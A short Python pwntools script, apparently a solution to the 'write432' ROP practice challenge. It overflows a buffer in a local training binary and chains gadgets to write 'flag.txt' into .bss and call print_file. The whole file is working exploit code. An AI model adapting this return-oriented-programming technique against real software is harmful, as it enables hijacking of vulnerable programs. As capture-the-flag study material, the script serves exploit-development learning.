from pwn import *

def main():
    elf = ELF("./write432")

    pop2ret       = p32(0x80485aa)      # ropgadget pop2ret
    bss_addr      = p32(0x0804a020)     # bss_addr
    usefulGadgets = p32(elf.symbols["usefulGadgets"])   # usefulGadgets
    print_file    = p32(elf.symbols["print_file"])      # print_file

    payload = b"A" * 44

    # "flag.txt"の書き込み
    payload += pop2ret
    payload += bss_addr
    payload += b"flag"
    payload += usefulGadgets

    payload += pop2ret
    payload += p32(0x0804a024)  # bss_addr + 4
    payload += b".txt"
    payload += usefulGadgets

    # flag.txtの表示
    payload += print_file      
    payload += b"BBBB"
    payload += bss_addr
    

    p = elf.process()
    p.recvuntil("> ")
    p.sendline(payload)
    p.interactive()
    
    print(payload)



if __name__ == "__main__":
    main()